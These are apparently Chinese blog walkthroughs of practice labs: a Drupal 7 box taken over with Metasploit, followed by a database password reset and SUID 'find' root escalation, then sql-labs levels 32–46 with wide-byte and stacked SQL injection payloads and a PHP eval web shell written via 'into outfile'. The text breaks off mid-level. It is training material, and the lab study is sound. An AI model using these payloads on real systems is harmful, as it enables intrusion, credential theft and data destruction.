href="#搜索可以使用的漏洞" class="headerlink" title="搜索可以使用的漏洞"></a>搜索可以使用的漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal 7.x</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904151926523.png"></p><h2 id="使用漏洞"><a href="#使用漏洞" class="headerlink" title="使用漏洞"></a>使用漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></figure><ul><li>0 是前面的编号</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904152024298.png"></p><h2 id="查看要填入的信息"><a href="#查看要填入的信息" class="headerlink" title="查看要填入的信息"></a>查看要填入的信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904152511242.png"></p><ul><li><p>后面选项 yes 的要把信息填好</p></li><li><p>根据要求只需要设置<code>RHOSTS</code>即目标靶场的IP</p><hr><h2 id=""><a href="#" class="headerlink" title=""></a></h2></li></ul><h2 id="设置目标靶场的ip"><a href="#设置目标靶场的ip" class="headerlink" title="设置目标靶场的ip"></a>设置目标靶场的ip</h2><ul><li><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.169.219     </span><br></pre></td></tr></table></figure></li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904153127967.png"></p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904153348759.png"></p><h1 id="使用shell"><a href="#使用shell" class="headerlink" title="使用shell"></a>使用shell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904153944142.png"></p><h1 id="开始寻找文件-flag-1-5"><a href="#开始寻找文件-flag-1-5" class="headerlink" title="开始寻找文件 flag 1-5"></a>开始寻找文件 flag 1-5</h1><h2 id="flag1-txt"><a href="#flag1-txt" class="headerlink" title="flag1.txt"></a>flag1.txt</h2><ul><li>在上面就可以看到</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904154342587.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每个好的内容管理系统都需要一个配置文件，所以你应该怎么做</span><br></pre></td></tr></table></figure><h2 id="flag2-txt"><a href="#flag2-txt" class="headerlink" title="flag2.txt"></a>flag2.txt</h2><ul><li>在<code>sites/default/default.setting.php</code>中找到</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904154755530.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆破和目录扫描并不是唯一获得后台的方法(并且你需要访问权限)，下面这些认证信息你怎么使用</span><br></pre></td></tr></table></figure><h3 id="数据库的一些信息"><a href="#数据库的一些信息" class="headerlink" title="数据库的一些信息"></a>数据库的一些信息</h3><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904155136445.png"></p><h3 id="登录mysql"><a href="#登录mysql" class="headerlink" title="登录mysql"></a>登录mysql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904160006704.png"></p><h3 id="查看数据库的信息"><a href="#查看数据库的信息" class="headerlink" title="查看数据库的信息"></a>查看数据库的信息</h3><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904160215935.png"></p><h3 id="表的信息"><a href="#表的信息" class="headerlink" title="表的信息"></a>表的信息</h3><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904160504887.png"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904160617609.png"></p><h3 id="使用users"><a href="#使用users" class="headerlink" title="使用users"></a>使用users</h3><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904160717103.png"></p><ul><li>信息有加密</li><li>密码的加密是破解不出来，需要重置管理的密码(加密脚本位置在网站根目录下的scripts&#x2F;password-hash.sh)</li></ul><h3 id="生成密码"><a href="#生成密码" class="headerlink" title="生成密码"></a>生成密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh 123</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$S$DJZxBpJutVqFt1SNCpsKOiFGcOYgt9dGqtoiN6vKXA8b05BbsAuD</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904161320822.png"></p><h3 id="修改密码，并且确认是否修改完成"><a href="#修改密码，并且确认是否修改完成" class="headerlink" title="修改密码，并且确认是否修改完成"></a>修改密码，并且确认是否修改完成</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&quot;$S$DJZxBpJutVqFt1SNCpsKOiFGcOYgt9dGqtoiN6vKXA8b05BbsAuD&quot; where uid=1;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904162101313.png"></p><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904162301003.png"></p><h2 id="flag3-txt"><a href="#flag3-txt" class="headerlink" title="flag3.txt"></a>flag3.txt</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904162621610.png"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904162650446.png"></p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd 发现了一个用户 flag4</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904170126942.png"></p><ul><li>Flag3提示词有<code>perms、find、-exec、shadow</code>共四个特殊提示词</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904170407015.png"></p><ul><li>进入&#x2F;home&#x2F;flag4</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904170333217.png"></p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><ul><li><p>使用find命令查找有特殊权限<code>suid</code>的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904170801425.png"></p></li><li><p>使用find命令提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ aaa -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904170943555.png"></p></li></ul><h2 id="thefinalflag-txt"><a href="#thefinalflag-txt" class="headerlink" title="thefinalflag.txt"></a>thefinalflag.txt</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904171140462.png"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904171225531.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs靶场 32-65</title>
      <link href="/archives/f6a7800a.html"/>
      <url>/archives/f6a7800a.html</url>
      
        <content type="html"><![CDATA[<h1 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。    中文、韩文、日文等均存在宽字节，英文默认都是一个字节。</span><br><span class="line">在使用PHP连接MySQL的时候，当设置“set  character_set_client = gbk&quot;时会导致一个编码转换的问题。</span><br><span class="line"></span><br><span class="line">例子：   </span><br><span class="line">id= 1&#x27;      处理  1 \&#x27;    进行编码   1%5c%27         带入sql后  id = \&#x27;and XXXX  此时无法完成注入</span><br><span class="line">id=1%df&#x27;    处理 1%df\&#x27;   进行编码   1%df%5c%27      带入sql后  id =1運&#x27;and XXX  此时存在宽字节注入</span><br></pre></td></tr></table></figure><h1 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1/sqli/Less-32/?id=1 这个时候返回的是正常数据</span><br><span class="line">2. http://127.0.0.1/sqli/Less-32/?id=1&#x27; 此时返回的是经过转义之后的数据，我们通过返回的数据可以看到，单引号已经被转义了 </span><br><span class="line">3. http://121.199.30.46/Less-32/?id=1%df&#x27; 或者http://121.199.30.46/Less-32/?id=1%df%27此时发现出现了注入点，这个时候我们继续</span><br><span class="line">4. http://121.199.30.46/Less-32/?id=1%df&#x27; --+ 这个时候返回正常</span><br><span class="line">5. http://121.199.30.46/Less-32/?id=1%df&#x27; order by 4 --+ 此时返回与以前的关卡中同样的错误，接下来就是正常的注入操作了。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%5c代表的是 \ </span><br><span class="line">此时构造： %5c %5c %5c %5c&#x27;</span><br><span class="line">只要是我们能将返回的结果中对于单引号没有转义字符进行处理即可。</span><br><span class="line">示例方法： http://121.199.30.46/Less-32/?id=-1%aa%5c&#x27; union select 1,2,3 --+</span><br><span class="line">其余操作基本相似。 </span><br></pre></td></tr></table></figure><h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通过源码可得知： 在32关中使用的是自定义的过滤，本关中使用的是php中的 addslashes()函数</span><br><span class="line"></span><br><span class="line">其作用:addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line"></span><br><span class="line">法1： 直接使用宽字节的方法</span><br><span class="line">http://127.0.0.1/sqli/Less-33/?id=1%df&#x27;--+</span><br><span class="line"></span><br><span class="line">法二：自定义闭合</span><br><span class="line">http://121.199.30.46/Less-33/?id=-1%aa%5c%27 union select 1,2,3--+</span><br><span class="line">其实和less32关基本相同。</span><br></pre></td></tr></table></figure><h1 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">我们首先测试在POST情况下，传入正确和错误的值回显情况：</span><br><span class="line">1.  admin:admin 正确的密码和账号   返回姓名等常规信息</span><br><span class="line">2.  ad:ad   错误的密码和账号       返回的是登录失败</span><br><span class="line">3.  同样通过代码可知，本关也使用了addslashes()函数，理论上我们可以使用前几关中的宽字节注入的方法进行测试，但是测试的时候发现，方法并不奏效。（主要原因是因为我们不能够直接在POST中传入数据，因为会被再次编码）</span><br><span class="line"></span><br><span class="line">分析：在get型传参的时候使用URLencode，所以我们可以使用以下两种方法：</span><br><span class="line">法一：我们借鉴了将单引号的UTF-8转换为UTF-16的单引号模式</span><br><span class="line">法二：我们使用burpsuite进行抓包之后对数据进行宽字节注入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们首先在使用bp进行抓包之后，在bp中修改信息得到返回信息即可！</span><br><span class="line">1. 我们本来传入的数据： a%df&#x27;</span><br><span class="line">2. 但是我们抓包之后的数据： uname=a%25df%2527&amp;passwd=a%25df%2527&amp;submit=Submit</span><br><span class="line">我们可以发现%经过url转换之后为%25</span><br><span class="line">所以我们需要在拦截数据包之后将数据进行修改： uname=a%df%27&amp;passwd=a%df%27&amp;submit=Submit</span><br><span class="line">接下来就是正常的注入流程。</span><br></pre></td></tr></table></figure><h1 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">其实本关和34基本相同，我们首先分析一下代码：</span><br><span class="line">$id=check_addslashes($_GET[&#x27;id&#x27;]);  首先还是对id的值进行过滤处理</span><br><span class="line">$sql=“SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 在这个位置中，id值没有经过单引号的包裹，所以我们只要在注入的时候防止我们构造的sql注入句子中避免单引号等即可！</span><br><span class="line"></span><br><span class="line">法一： 联合查询注入</span><br><span class="line">http://127.0.0.1/sqli/Less-35/?id=-1 union select 1,2,group_concat(schema_name) from    information_schema.schemata#</span><br><span class="line"></span><br><span class="line">法二：延时注入</span><br><span class="line">http://127.0.0.1/sqli/Less-35/?id=1 and  if( length(database())=1, 1, sleep(5)    )#通过这样的方式进行判断。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">我们首先进行源代码审计，发现代码中使用了</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string 函数</span><br><span class="line"></span><br><span class="line">我们此处尝试直接使用原来的宽字节注入：</span><br><span class="line">http://127.0.0.1/sqli/Less-36/?id=1%df&#x27; # 发现有作用，可以进行注入</span><br><span class="line">http://127.0.0.1/sqli/Less-36/?id=1111%df&#x27;   union select 1,2,3 --+ 接下来就是正常的注入流程了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">完整演示：</span><br><span class="line"></span><br><span class="line">1. http://127.0.0.1/sqli/Less-36/?id=1111%df&#x27;   union select 1,2,group_concat(schema_name) from information_schema.schemata  --+ 1取出所有的库</span><br><span class="line">2. http://127.0.0.1/sqli/Less-36/?id=1111%df&#x27;   union select 1,2,group_concat(table_name) from  information_schema.tables where table_schema = 0x7365637572697479  --+ 取出所有的表</span><br><span class="line">3. http://127.0.0.1/sqli/Less-36/?id=1111%df&#x27;   union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 0x7573657273  --+ 取出所有的字段</span><br><span class="line">4. http://127.0.0.1/sqli/Less-36/?id=1111%df&#x27;   union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users  --+ 取出所有的字段的值</span><br><span class="line"></span><br><span class="line">注意：为什么一直强调能够使用十六进制的就使用十六进制，因为本关中单引号全部会被转义</span><br></pre></td></tr></table></figure><h1 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">我们首先测试在POST情况下，传入正确和错误的值回显情况：</span><br><span class="line">1.   admin:admin 正确的密码和账号 返回姓名等常规信息</span><br><span class="line">2.   ad:ad   错误的密码和账号返回的是登录失败</span><br><span class="line">3.   与34关基本相似，本关只是将过滤函数进行了替换： mysql_real_escape_string()，同样，我们可以直接按照34关的方法即可！</span><br><span class="line">分析：在get型传参的时候使用URLencode，所以我们可以使用以下两种方法：</span><br><span class="line">法一：我们借鉴了将单引号的UTF-8转换为UTF-16的单引号模式 &#x27;   &#x27;</span><br><span class="line">法二：我们使用burpsuite进行抓包之后对数据进行宽字节注入</span><br><span class="line">详见34</span><br></pre></td></tr></table></figure><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p><a href="https://www.cnblogs.com/lcamry/p/5762905.html">https://www.cnblogs.com/lcamry/p/5762905.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。</span><br><span class="line">我们可以在mysql命令行中进行测试：</span><br><span class="line">Select * from users; create table test1 like users;</span><br><span class="line">Show tables;</span><br><span class="line">Select * from users; drop table test1;</span><br><span class="line">Select * from users; select 1,2,3;</span><br></pre></td></tr></table></figure><h1 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们直接构造语句：</span><br><span class="line">http://127.0.0.1/sqli/Less-38/?id=1&#x27;; create table test2 like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http://127.0.0.1/sqli/Less-38/?id=1&#x27;; drop table test2 ; --+</span><br></pre></td></tr></table></figure><h1 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">与less38不相同的地方是sql语句的id值处理：我们将38中的id=&#x27; &#x27;; 修改为id= ; 即可</span><br><span class="line"></span><br><span class="line">我们直接构造语句：</span><br><span class="line">http://127.0.0.1/sqli/Less-39/?id=1 ; create table test2 like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http://127.0.0.1/sqli/Less-39/?id=1 ; drop table test2 ; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">与less38、39不相同的地方是这里的错误不会回显，但是不影响我们注入测试，而且我们将id修改为id=(&#x27; &#x27;);</span><br><span class="line">我们直接构造语句：</span><br><span class="line">http://127.0.0.1/sqli/Less-40/?id=1&#x27;); create table test2 like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http://127.0.0.1/sqli/Less-40/?id=1&#x27;); drop table test2 ; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">和40关相同，没有回显信息，但是不影响我们注入测试，而且id值没有经过包裹；</span><br><span class="line">我们直接构造语句：</span><br><span class="line">http://127.0.0.1/sqli/Less-41/?id=1 ; create table test2 like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http://127.0.0.1/sqli/Less-40/?id=1 ; drop table test2 ; --+</span><br></pre></td></tr></table></figure><h1 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">当我们第一眼看到这个界面的时候，感觉和二次注入是不是有点像，但是这里和二次注入有一点不同：</span><br><span class="line"></span><br><span class="line">我们直接来到login.php中，观察username和password的处理问题：</span><br><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);  </span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br><span class="line">此时的sql为： &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot; </span><br><span class="line">我们可以看到password没有经过mysqli_real_escape_string()函数进行处理，所以这个时候我们在这个位置进行构造：</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line"></span><br><span class="line">a&#x27;; create table test2 like users;   # 然后观察是否有test2表</span><br><span class="line">a&#x27;;  drop table test2;               # 观察test2表是否删除</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这一关和less42非常像，区别就在于对于id值得处理：</span><br><span class="line">此时的sql为： $sql = &quot;SELECT * FROM users WHERE username=(&#x27;$username&#x27;) and password=(&#x27;$password&#x27;)&quot;;</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a&#x27;); create table test2 like users; #   然后观察是否有test2表</span><br><span class="line">a&#x27;);  drop table test2; # 观察test2表是否删除</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本关和前面的基本是一样的，只是没有报错回显信息</span><br><span class="line">此时的sql为： $sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a&#x27;; create table test2 like users; #   然后观察是否有test2表</span><br><span class="line">a&#x27;;  drop table test2; # 观察test2表是否删除</span><br></pre></td></tr></table></figure><h1 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本关和less43关的基本是一样的，只是没有报错回显信息</span><br><span class="line">此时的sql为： $sql = &quot;SELECT * FROM users WHERE username=(&#x27;$username&#x27;) and password=(&#x27;$password&#x27;)&quot;;</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a&#x27;); create table test2 like users; #   然后观察是否有test2表</span><br><span class="line">a&#x27;);  drop table test2; # 观察test2表是否删除</span><br></pre></td></tr></table></figure><h1 id="堆叠注入写一句话木马"><a href="#堆叠注入写一句话木马" class="headerlink" title="堆叠注入写一句话木马"></a>堆叠注入写一句话木马</h1><ul><li>写权限</li><li>一句话木马</li><li>select xxx into outfile xxx</li><li>写入点; 绝对路径<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">php一句话木马：&lt;?php   @eval($_POST[test2]); ?&gt;</span><br><span class="line">绝对路径： C:\phpstudy\PHPTutorial\WWW\</span><br><span class="line">使用函数： select xxx into  outfile xxx</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[test2]);?&gt;&#x27; into outfile &#x27;C:\\phpstudy\\PHPTutorial\\WWW\\test2.php&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h1 id="mysql知识补充"><a href="#mysql知识补充" class="headerlink" title="mysql知识补充"></a>mysql知识补充</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 1 desc;  使用降序进行排列</span><br><span class="line"></span><br><span class="line">select * from users order by1 asc;使用升序进行排列</span><br><span class="line"></span><br><span class="line">right()    select right(database(),1);</span><br><span class="line"></span><br><span class="line">Left()    select left(database(),1);</span><br><span class="line"></span><br><span class="line">lines terminated by xxx   以xxx为结尾:</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php @eval($_ POST[test2]);?&gt;&#x27; into outfile &#x27;C:\pbpstudy\PHPTutorilWWW.test2.pbp&#x27;  lines terminated by 0x363636; </span><br><span class="line"></span><br><span class="line">最后写好的文件会以666结尾。</span><br></pre></td></tr></table></figure><h1 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1/sqlii/Lesss 46/?sort=3          sort的 值我们可以设置1,2,3均可!</span><br><span class="line">2. 